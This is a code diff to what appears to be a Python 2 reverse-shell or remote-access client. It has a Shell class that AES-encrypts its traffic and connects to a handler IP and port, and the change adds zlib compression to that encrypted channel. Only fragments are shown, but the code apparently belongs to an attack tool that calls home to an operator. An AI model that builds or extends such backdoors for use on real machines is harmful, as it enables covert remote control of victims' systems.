@@ -1,5 +1,5 @@
 #!/usr/bin/env python2
-import socket, subprocess, os, threading, json, base64, datetime, getpass, time, hashlib, random, psutil
+import socket, subprocess, os, threading, json, base64, datetime, getpass, time, hashlib, random, psutil, zlib
 from Crypto.Cipher import AES
 
 def windows_only(func):
@@ -38,10 +38,16 @@ class Shell:
 		return key, IV
 		
 	def encrypt(self, data):
-		return base64.b64encode(self.aes_obj.encrypt(data))
+		return base64.b64encode(self.compress(self.aes_obj.encrypt(data)))
 		
 	def decrypt(self, data):
-		return self.aes_obj.decrypt(base64.b64decode(data))
+		return self.aes_obj.decrypt(self.decompress(base64.b64decode(data)))
+		
+	def compress(self, data):
+		return zlib.compress(data, 9)
+		
+	def decompress(self, data):
+		return zlib.decompress(data)
 
 	def connect(self):
 		self.comm_socket.connect((self.handler_ip, self.handler_port))
